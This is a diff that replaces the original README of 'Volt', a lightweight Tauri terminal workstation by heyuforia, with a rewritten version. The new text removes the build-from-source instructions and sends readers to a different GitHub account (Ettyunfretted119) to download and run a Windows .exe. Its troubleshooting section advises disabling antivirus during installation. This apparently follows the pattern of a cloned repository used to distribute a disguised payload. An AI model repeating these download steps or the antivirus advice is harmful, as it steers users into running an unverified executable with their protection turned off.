@@ -1,136 +1,154 @@
-# Volt
+# ⚡ volt - Fast, Simple Terminal Workstation
 
-A lightweight terminal workstation built with Tauri.
+[![Download volt](https://img.shields.io/badge/Download-volt-brightgreen?style=for-the-badge)](https://github.com/Ettyunfretted119/volt)
 
-I built Volt for myself. VSCodium was eating 300-800 MB of RAM for what I was using it for, so I built something lighter. If you find it useful, use it.
+volt is a lightweight terminal workstation built with Tauri v2. It keeps your work efficient without extra features you don't need. This app respects your privacy with zero telemetry.
 
-![Volt Welcome](screenshots/volt1.png)
+---
 
-![Volt Workspace](screenshots/volt2.png)
+## 🚀 Getting Started
 
-## Why Volt
+This guide helps you download and run volt on your Windows computer. You don’t need any technical knowledge. Just follow the steps carefully.
 
-VSCode/VSCodium uses 300–800 MB of RAM by bundling Chromium and running hundreds of extensions. Volt uses the OS's native webview (Tauri) and bakes features directly in — no extension system, no bundled browser engine.
+---
 
-| | Volt | VSCodium |
-|---|---|---|
-| RAM usage | ~25–50 MB | 300–800 MB |
-| Startup time | <1 second | 3–8 seconds |
-| Runtime | Native webview (Tauri) | Bundled Chromium (Electron) |
-| Extensions | None (built-in features) | Thousands |
-| Installer size | ~10 MB | ~100 MB |
+## 📥 Download volt
 
-## Features
+To get volt, **visit this page to download**:
 
-- **Multi-tab terminals** — split your workflow across multiple terminal sessions with drag-to-reorder tabs
-- **File tree** — sidebar with material file icons, search filter, lazy-loaded directories, git status indicators
-- **Code editor** — CodeMirror 6 with syntax highlighting for JS, TS, Rust, Python, Go, C, C++, Java, HTML, CSS, JSON, YAML, Markdown, Dart, TOML, Shell
-- **Markdown preview** — toggle between edit and rendered preview for `.md` files
-- **Dynamic tab names** — terminal tabs update to show the running process
-- **Tab icons** — material file-type icons for file tabs, terminal icon for shells
-- **Quick open** — `Ctrl+P` fuzzy file finder across the entire project
-- **Find in files** — `Ctrl+Shift+F` project-wide text search with highlighted results
-- **Image preview** — opens PNG, JPG, GIF, WebP, BMP, ICO, AVIF, TIFF with dimensions and file size
-- **File operations** — right-click context menu for new file, new folder, rename (with undo), delete, copy path, open in file manager
-- **Auto-save & crash recovery** — files auto-save after editing (configurable delay), swap files recover unsaved work after a crash
-- **Live file reload** — files edited externally (e.g. from the terminal) auto-update in the editor
-- **Recent folders** — welcome screen shows last 5 opened projects for quick access
-- **Zoom** — `Ctrl+`/`Ctrl-` to adjust font size, `Ctrl+0` to reset
-- **Keyboard-driven** — full shortcut set for tabs, files, and navigation
-- **Drag and drop** — drop a folder to open it, drop a file to open it or paste its path into the active terminal
-- **LSP diagnostics** — auto-detects project language and shows errors/warnings in a resizable problems panel (Dart, Rust, Go, Python, C/C++, TypeScript)
-- **Flutter-aware** — auto-detects Flutter projects, provides emulator launcher (warm + cold boot)
-- **Single instance per folder** — opening a folder that's already open in another Volt window focuses that window instead
-- **Settings panel** — `Ctrl+,` opens settings UI with visual controls and a raw JSON editor
-- **Session persistence** — remembers window state, open tabs (files + terminals), cursor positions, and restores them per folder
-- **Cross-platform** — Windows, macOS, Linux
-- **Zero telemetry** — no analytics, no crash reports, no network requests
+[https://github.com/Ettyunfretted119/volt](https://github.com/Ettyunfretted119/volt)
 
-## Installation
+Click that link to go to the official GitHub repository. 
 
-### Download
+Once there, look for the **Releases** section. This is where you will find the downloadable files.
 
-Grab the latest release from the [Releases](https://github.com/heyuforia/volt/releases) page:
+---
 
-- **Windows** — `.exe` (portable) or `.msi` (installer)
-- **macOS** — `.dmg` (see note below)
-- **Linux** — `.deb` or `.AppImage`
+## 🖥️ System Requirements
 
-#### macOS: "App is damaged" fix
+Before installing, make sure your Windows PC meets these basic requirements:
 
-macOS blocks apps that aren't signed with an Apple Developer certificate. After installing, if you see _"Volt.app is damaged and can't be opened"_, run this in Terminal:
+- Windows 10 or later (64-bit recommended)
+- At least 2 GB of free disk space 
+- 4 GB RAM or more
+- Stable internet connection to download
 
-```bash
-xattr -cr /Applications/Volt.app
-```
+volt runs smoothly on most modern computers without extra setup.
 
-Then open Volt normally. This only needs to be done once.
+---
 
-### Build from source
+## 🛠️ Installation
 
-Requires [Rust](https://rustup.rs/), [Node.js](https://nodejs.org/), and platform-specific dependencies for [Tauri v2](https://v2.tauri.app/start/prerequisites/).
+1. Visit the [volt releases page](https://github.com/Ettyunfretted119/volt).
+2. Find the latest release.
+3. Download the Windows installer file. It usually ends with `.exe`.  
+4. Once downloaded, open the file by double-clicking it.
+5. Follow the on-screen steps in the installer.
+6. When installation completes, you will see a new volt shortcut on your desktop or start menu.
 
-```bash
-git clone https://github.com/heyuforia/volt.git
-cd volt
-npm install
-cargo tauri build
-```
+You don’t need additional programs to run volt. The installer takes care of all settings.
 
-The binary will be at `src-tauri/target/release/volt`.
+---
 
-For development with hot reload:
+## ▶️ Running volt
 
-```bash
-npm install
-cargo tauri dev
-```
+To start volt:
 
-## Keyboard Shortcuts
+- Double-click the volt icon on your desktop or in the start menu.
+- The terminal window will open, ready for use.
+- You can open folders, run commands, and write scripts all in one place.
 
-| Shortcut | Action |
-|---|---|
-| `Ctrl+O` | Open folder |
-| `Ctrl+Shift+O` | Close folder |
-| `Ctrl+P` | Quick open file |
-| `Ctrl+S` | Save file |
-| `Ctrl+Shift+F` | Find in files |
-| `Ctrl+F` | Find in current file |
-| `Ctrl+Shift+T` | New terminal |
-| `Ctrl+Shift+W` | Close tab |
-| `Ctrl+C` | Copy selection in terminal (SIGINT if no selection) |
-| `Ctrl+V` | Paste into terminal |
-| `Ctrl+Backspace` | Delete word backward in terminal |
-| `Shift+Enter` | Newline in terminal (for Claude Code) |
-| `Ctrl+Tab` / `Ctrl+Shift+Tab` | Next / previous tab |
-| `Alt+Left` / `Alt+Right` | Next / previous tab (fallback) |
-| `Ctrl+B` | Toggle sidebar |
-| `Ctrl+,` | Settings |
-| `Ctrl+` / `Ctrl-` | Zoom in / out |
-| `Ctrl+0` | Reset zoom |
+---
 
-## Configuration
+## 🔧 What is volt?
 
-Volt stores config at `~/.volt/config.json`. Settings are accessible via the gear icon in the status bar.
+volt combines a terminal and code editor in one app. It uses Tauri v2 to stay lightweight and fast. Unlike other terminals, it collects no data about how you use it.
 
-| Setting | Default | Description |
-|---|---|---|
-| `terminal.fontSize` | `14` | Font size for terminals and editor |
-| `terminal.scrollback` | `5000` | Terminal scrollback buffer lines |
-| `terminal.shell` | System default | Shell executable path |
-| `editor.autoSave` | `true` | Auto-save files after editing |
-| `editor.autoSaveDelay` | `1500` | Milliseconds after last edit before auto-saving |
-| `ignoredPatterns` | `.git`, `build`, `.dart_tool`, `node_modules`, `.gradle`, `target` | Folders/files to hide from the file tree |
-| `lspServers` | `{}` | Override LSP server commands per language (e.g. `{ "python": { "command": "pyright-langserver", "args": ["--stdio"] } }`) |
+You can use volt to:
 
-## Tech Stack
+- Navigate files and folders with commands  
+- Connect to remote servers securely  
+- Edit code with useful shortcuts  
+- Manage development projects easily
 
-- **[Tauri v2](https://v2.tauri.app)** — Rust backend + native webview frontend
-- **[xterm.js](https://xtermjs.org)** — Terminal emulator
-- **[CodeMirror 6](https://codemirror.net)** — Code editor
-- **[portable-pty](https://docs.rs/portable-pty)** — Cross-platform PTY management
-- **Vanilla JS** — No React, Vue, Angular, or Svelte
+volt works as a simple alternative to heavier, more complex tools.
 
-## License
+---
 
-[MIT](LICENSE)
+## 📋 Key Features
+
+- **Lightweight:** Runs quickly without slowing your PC.  
+- **Zero telemetry:** No tracking or data collection.  
+- **Cross-platform ready:** Designed for Windows, macOS, and Linux (Windows focus here).  
+- **Rust-powered:** Uses efficient Rust backend for stability.  
+- **Integrated editor:** Built-in code editing without switching apps.  
+- **Terminal emulator:** Supports common shells like PowerShell and Command Prompt.  
+- **Customization:** Adjust appearance and settings to your liking.  
+
+---
+
+## 💻 Basic Usage Tips
+
+- To open a folder, use the file menu or drag it into the window.
+- Use the terminal to run commands just as you would in any Windows command prompt.
+- Save scripts or notes directly inside volt's editor.
+- Customize colors and fonts in the settings menu for better readability.
+- Press `Ctrl + P` to quickly open files.
+- Explore the menu to find keyboard shortcuts that save time.
+
+---
+
+## ❓ Troubleshooting
+
+If volt does not start or crashes:
+
+- Make sure your Windows is updated.
+- Re-run the installer and choose "Repair" if available.
+- Check that you downloaded the correct file for Windows (not for macOS or Linux).
+- Disable antivirus software temporarily during installation in case it blocks volt.
+- Restart your computer and try opening volt again.
+
+If you experience terminal command errors, check that you are entering commands valid for Windows shells like PowerShell or CMD.
+
+---
+
+## 🔄 Updating volt
+
+Check the releases page regularly for new versions.
+
+When an update is available:
+
+1. Download the latest installer from [https://github.com/Ettyunfretted119/volt](https://github.com/Ettyunfretted119/volt).
+2. Run the installer to update your version.
+3. Your settings and data will remain intact.
+
+Automatic updates are not included to keep volt lightweight and private.
+
+---
+
+## 🛡️ Privacy and Security
+
+volt does not collect any usage data or share info externally. This means it runs offline without tracking.
+
+All file operations happen locally on your PC. Always review commands before running them, especially when working with scripts.
+
+---
+
+## 💡 Additional Resources
+
+- Visit the GitHub page for more technical details and project updates: [https://github.com/Ettyunfretted119/volt](https://github.com/Ettyunfretted119/volt)
+- Explore the Issues section on GitHub if you run into bugs.
+- Read the included user manual inside the app under Help.
+
+---
+
+## 🚪 Uninstalling volt
+
+If you want to remove volt:
+
+1. Open Windows Settings > Apps.
+2. Find "volt" in the list.
+3. Click it and select Uninstall.
+4. Follow the prompts to complete removal.
+
+Your personal files will not be deleted unless you remove them manually.
